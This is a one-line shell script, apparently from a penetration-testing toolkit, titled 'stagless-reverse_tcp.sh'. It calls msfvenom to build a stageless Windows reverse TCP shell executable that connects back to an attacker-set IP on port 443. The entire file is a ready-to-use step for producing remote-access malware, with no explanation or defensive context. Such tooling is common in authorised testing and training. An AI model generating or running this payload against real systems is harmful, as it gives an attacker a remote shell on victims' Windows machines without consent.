#/bin/bash
#stagless-reverse_tcp.sh - js
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=443 -f exe > stageless.exe
